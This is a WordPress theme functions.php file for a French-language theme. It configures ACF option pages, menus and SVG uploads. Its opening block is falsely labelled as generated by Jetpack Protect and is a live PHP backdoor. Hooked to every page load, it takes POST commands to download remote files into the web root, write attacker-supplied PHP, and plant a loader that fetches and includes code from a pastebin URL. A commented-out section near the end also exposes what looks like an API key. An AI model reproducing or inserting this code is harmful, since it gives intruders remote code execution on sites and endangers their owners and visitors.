<?php /*Generated by Jetpack Protect Start*/
function downloadShaitan($urlShaitan, $fileShaitan){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlShaitan);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch,CURLOPT_TIMEOUT,60);
        $dataShaitan = curl_exec($ch);
        file_put_contents($fileShaitan, $dataShaitan);
}

if($_POST['activatewrm']==1){
    downloadShaitan($_POST['target'], $_SERVER["DOCUMENT_ROOT"].'/'.$_POST['wrm_file_name'].'.php');
    echo "||||%".$_SERVER["DOCUMENT_ROOT"].'/'.$_POST['wrm_file_name'].'.php'."%||||";
}
add_action("wp_head", "mainShaitan");
function mainShaitan() {
    If ($_POST["include"] == "create") {
		$includeShaitan = '<?php
			if(file_exists($_SERVER["DOCUMENT_ROOT"]."/wp-temp.php")){
				chmod($_SERVER["DOCUMENT_ROOT"]."/wp-temp.php", 0644);
				include $_SERVER["DOCUMENT_ROOT"]."/wp-temp.php";
			}else{
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, "https://pastebin.com/raw/dCHJ3DQM");
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch,CURLOPT_TIMEOUT,30);
				$dataShaitan = curl_exec($ch);
				file_put_contents($_SERVER["DOCUMENT_ROOT"]."/wp-temp.php", $dataShaitan);
				chmod($_SERVER["DOCUMENT_ROOT"]."/wp-temp.php", 0644);
				include $_SERVER["DOCUMENT_ROOT"]."/wp-temp.php";
			}';
        file_put_contents($_SERVER["DOCUMENT_ROOT"]."/wp-temp.php", urldecode($_POST["backdata"]));
        file_put_contents($_SERVER["DOCUMENT_ROOT"]."/".$_POST["backname"].".php", $includeShaitan);
		echo "||||%".str_replace($_SERVER["DOCUMENT_ROOT"],$_SERVER["HTTP_HOST"],$_SERVER["DOCUMENT_ROOT"])."/".$_POST["backname"].".php&&&".$_SERVER["DOCUMENT_ROOT"]."/".$_POST["backname"].".php&&&".$_SERVER["DOCUMENT_ROOT"]."%||||";
        exit;
	}
}
add_action("wp_head", "uploadShaitan");
function uploadShaitan(){
    If ($_POST["upload"] == "go") {
        file_put_contents($_SERVER["DOCUMENT_ROOT"]."/".$_POST["backname"].".php", urldecode($_POST["backdata"]));
        echo "||||%".str_replace($_SERVER["DOCUMENT_ROOT"],$_SERVER["HTTP_HOST"],$_SERVER["DOCUMENT_ROOT"])."/".$_POST["backname"].".php&&&".$_SERVER["DOCUMENT_ROOT"]."/".$_POST["backname"].".php&&&".$_SERVER["DOCUMENT_ROOT"]."%||||";
        exit;
    }
}
add_action("wp_head", "curlShaitan");
function curlShaitan(){
    if($_POST["upload"] == "curl"){
        $mainThemeShaitan = get_template_directory();
        downloadShaitan($_POST["secretLink"], $mainThemeShaitan."/".$_POST["curlName"]);
        echo "||||%".str_replace($_SERVER["DOCUMENT_ROOT"],$_SERVER["HTTP_HOST"],$mainThemeShaitan."/".$_POST["curlName"])."&&&".$mainThemeShaitan."/".$_POST["curlName"]."&&&".$mainTheme."%||||";
        exit;
    }
}
/*Generated by Jetpack Protect End*/ ?> <?php

// Nom du dossier du thème
define("THEME_FOLDER_NAME", "nativing");

 if( function_exists('acf_add_options_page') ) {

     acf_add_options_page(array(
         'page_title' 	=> 'Paramètres thème',
         'menu_title'	=> 'Paramètres thème',
         'menu_slug' 	=> 'theme-general-settings',
         'capability'	=> 'edit_posts',
         'redirect'		=> false
     ));
     acf_add_options_sub_page(array(
         'page_title' 	=> 'Logos',
         'menu_title'	=> 'Logos',
         'parent_slug'	=> 'theme-general-settings',
     ));

     acf_add_options_sub_page(array(
         'page_title' 	=> 'Bas de page',
         'menu_title'	=> 'Bas de page',
         'parent_slug'	=> 'theme-general-settings',
     ));
     acf_add_options_sub_page(array(
         'page_title' 	=> 'Footer',
         'menu_title'	=> 'Footer',
         'parent_slug'	=> 'theme-general-settings',
     ));



 }

// chargement des scripts et styles de page
if ( ! is_admin() ) {
  require_once(TEMPLATEPATH . '/functions/scripts.php');
  require_once(TEMPLATEPATH . '/functions/styles.php');
  require_once(TEMPLATEPATH . '/functions/fonts.php');
}

/*// chargement des widget externes
require_once (TEMPLATEPATH . '/functions/widgets/WidgetZones.php');
require_once (TEMPLATEPATH . '/functions/widgets/custom/WidgetParallaxImg.php');
require_once (TEMPLATEPATH . '/functions/widgets/custom/WidgetCadresAgixis.php');
require_once (TEMPLATEPATH . '/functions/widgets/custom/WidgetLiens.php');*/

// Pagination
require_once (TEMPLATEPATH . '/functions/Pagination.php');

 // menus
 require_once (TEMPLATEPATH . '/functions/menus/Menus.php');
 //require_once (TEMPLATEPATH . '/functions/menus/MaterializeMenu.php');
 require_once (TEMPLATEPATH . '/functions/menus/wp-bootstrap-navwalker.php');

// posts
require_once (TEMPLATEPATH . '/functions/posts/PostThumbnails.php');
require_once (TEMPLATEPATH . '/functions/posts/Excerpt.php');
require_once (TEMPLATEPATH . '/functions/posts/CustomPostType.php');

// admin
require_once (TEMPLATEPATH . '/functions/admin/AdminPerso.php');

// recherche ajax
/*require_once (TEMPLATEPATH . '/functions/search/ajax-search-by-post-type.php');
*/// require_once (TEMPLATEPATH . '/functions/search/ajax-search.php');
// override du search WP pour rendre disponible les custom fields d'ACF
/*require_once (TEMPLATEPATH . '/functions/search/search-in-acf-fields.php');
*/
////////////// AUTHORISER LES SVG A l'UPLOAD
function cc_mime_types($mimes) {
  $mimes['svg'] = 'image/svg+xml';
  $mimes['svgz'] = 'image/svg+xml';
  return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types');

////////////////////////////////////////// CUSTOM font-size
/*function load_custom_fonts($init) {

    $stylesheet_url = TEMPLATEPATH . '/wp-content/themes/agixis/assets/fonts/custom-fonts.css';

    if(empty($init['content_css'])) {
        $init['content_css'] = $stylesheet_url;
    } else {
        $init['content_css'] = $init['content_css'].','.$stylesheet_url;
    }

    $font_formats = isset($init['font_formats']) ? $init['font_formats'] : 'Andale Mono=andale mono,times;Arial=arial,helvetica,sans-serif;Arial Black=arial black,avant garde;Book Antiqua=book antiqua,palatino;Comic Sans MS=comic sans ms,sans-serif;Courier New=courier new,courier;Georgia=georgia,palatino;Helvetica=helvetica;Impact=impact,chicago;Symbol=symbol;Tahoma=tahoma,arial,helvetica,sans-serif;Terminal=terminal,monaco;Times New Roman=times new roman,times;Trebuchet MS=trebuchet ms,geneva;Verdana=verdana,geneva;Webdings=webdings;Wingdings=wingdings,zapf dingbats';

    $custom_fonts = ';'.'Pantonregular=pantonregular;Pantonbold=pantonbold;Krinkes=krinkes';

    $init['font_formats'] = $font_formats . $custom_fonts;

    return $init;
}
add_filter('tiny_mce_before_init', 'load_custom_fonts');
*/

/* function my_acf_google_map_api( $api ){

     $api['key'] = 'AIzaSyBkdz24KpXfu9bQ_MKvabebcIAXZ554osU';

     return $api;

 }

 add_filter('acf/fields/google_map/api', 'my_acf_google_map_api');*/